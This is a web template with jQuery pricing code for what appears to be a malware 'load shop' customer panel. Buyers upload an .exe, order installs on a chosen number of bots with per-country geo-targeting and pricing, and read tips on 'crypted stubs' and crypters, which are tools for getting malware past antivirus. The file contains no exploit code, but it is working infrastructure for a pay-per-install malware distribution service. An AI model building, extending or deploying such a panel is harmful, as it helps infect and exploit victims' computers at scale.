
<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Add Amount</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <input name="addBalance" style="display: none;" value="1">
                    <div class="form-group">
                        <label for="exampleInputEmail1">Amount to add</label>
                        <input type="number" class="form-control" name="amount" id="amount" aria-describedby="amount" placeholder="5">
                        <small id="amount" class="form-text text-muted">Enter the Amount you want to add in USD($).</small>
                    </div>


                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Finish Payment -></button>
                </div>
            </form>
        </div>
    </div>
</div>
{include file="header.tpl" title=foo}
{include file="nav.tpl"}
<div id="content-wrapper">

    <div class="container-fluid">

        <!-- Breadcrumbs-->
        <ol class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="#">Load Shop</a>
            </li>
            <li class="breadcrumb-item active">Overview</li>
        </ol>

        <!-- Icon Cards-->
        <div class="row" >
            <div  class="col-xl-6 col-sm-6 mb-6">


                <form action="" method="post" enctype="multipart/form-data">
                    <input style="display: none;" name="order" value="1">
                    <h6 class="mb-10">Upload Software</h6>
                    <div style="width: 100%">
                        <input type="file" class="dropify" name="uploaded_file"  accept=".exe" required>
                    </div>
                    <br>
                    <div class="space">
                        <h6 class="mb-1">Total Bots</h6>
                        <input type="number" id="number" class="form-control mb-1" value="200" name="amount"
                               placeholder="Ex. 250" style="width:100%;" required>
                    </div>

                    <br>
                    <div class="space">
                        <input type="checkbox" name="enableWordMix" id="enableWordMix" value="1"
                               style="display: none;">
                        Enable Geo-Targeting  <label for="enableWordMix" class="toggle"><span></span> </label>

                        <div style="display: none;" id="wordMixSelect">

                            <input id="load_counties" name="load_counties" style="display: none;">
                            <select id="multiselect" multiple="multiple">

                            </select>

                            <table class="table">
                                <tr>
                                    <th>Country</th>
                                    <th>Bots</th>
                                    <th>Price per bot</th>
                                    <th>Price</th>
                                </tr>
                                <tbody id="addPrices">
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <hr>
                    <h3>($<span id="price"></span>) </h3>

                    <hr>
                    1. If geotarget was selected for a order and the country cannot be fulfilled, balance will be refunded excluded the amount that was delivered. This process is manual so please contact us if the delivery has taken over 24 hours.<br><br>
                    2. Before opening a ticket about receiving issues, pause your order and check your file, you can also swap file to the raw stub and send few executes and change back to crypted stub to check if you have a crypting problem because not all crypters work for all software.
<br>
<br>
                    <button type="submit" class="btn btn-primary" id="submitBtn"><i class="fas fa-shopping-cart" style="margin-right: 3px;"></i>
                        Add Order
                    </button>
                </form>



            </div>
            <div  class="col-xl-6 col-sm-6 mb-6">

                <table class="table">
                    <tr>
                        <th colspan="">Go TO Order Statistics</th>
                        <th colspan="">Load Amount</th>
                        <th colspan="">Create Date</th>
                    </tr>
                    {foreach from=$orders item=order}
                        <tr>
                            <td>  <a href="/bot_loads/statistics/{$order.api_id}"> {$order.api_id} </a></td>
                           <td> {$order.load_amount}</td>
                           <td> {$order.created_at}</td>
                        </tr>
                    {/foreach}
                </table>

            </div>
        </div>

    </div>
</div>




{include file="footer.tpl"}
{$currentAlerts}


<script>
    var pricejson = '{$priceList}';
    $(document).ready(function() {
        $('.dropify').dropify({

            messages: {
                'default': 'Upload a new File to your Task',
                'replace': 'Drag and drop or click to replace',
                'remove':  'Remove',
                'error':   'Ooops, something wrong happended.'
            }
        });
        updatePrice();
        priceList = jQuery.parseJSON(pricejson);
        $.each(priceList,function(index, value){
            if(value.iso_short != "mix"){
                $("#multiselect").append("<option data-price='"+value.price_usd+"' value='"+value.iso_short+"'>"+value.iso_short+"</option>")
            }
        });
        $( "#enableWordMix" ).click(function() {
            calc();
            $("#wordMixSelect").toggle();
        });
        $('#multiselect').multiselect({
            buttonWidth: '100%',
            includeSelectAllOption : true,
            nonSelectedText: 'Select an Option'
        });
        $('#number').change(function(){
            calc();
        });
        $('#multiselect').change(function(){
            calc();
        });
        $('#number').change(function(){
            updatePrice();
        });
    });
    function updatePrice()
    {
        priceList = jQuery.parseJSON(pricejson);
        $.each(priceList,function(index, value){
            if(value.iso_short == "mix"){
                var price = $("#number").val() * value.price_usd;
                $("#price").html(price.toFixed(2) + ' USD');
            }
        });
    }
    function calc() {
        if($('#enableWordMix').is(":checked")){
            $("#addPrices").empty();
            currentSelectedCountrys = [];
            var amount =  $("#number").val();
            difference = Math.round(amount / $('#multiselect').val().length);
            console.log(difference);
            topay = 0;
            if(amount != ""){
                $.each(priceList, function( k, v ) {
                    $.each( $('#multiselect').val(), function( k, selected ) {
                        //console.log(v);
                        if(v.iso_short == selected){
                            topay = topay + (difference * v.price_usd);
                            currentSelectedCountrys[v.iso_short] = difference * v.price_usd;
                            $("#addPrices").append("<tr><td>"+v.iso_short+"</td><td>"+difference+"</td> <td> $ "+v.price_usd+" </td><td>$ "+difference * v.price_usd+" </td></tr>");
                        }
                    });
                });
            }
            if(topay == 0){
                updatePrice();
            }else{
                $("#price").html(topay);
                $("#load_counties").val($('#multiselect').val().join(","));
            }
            console.log(  currentSelectedCountrys );
        }else{
            updatePrice();
        }
    }
    function getSelectedValues() {
        var selectedVal = $("#multiselect").val();
        return selectedVal;
    }
</script>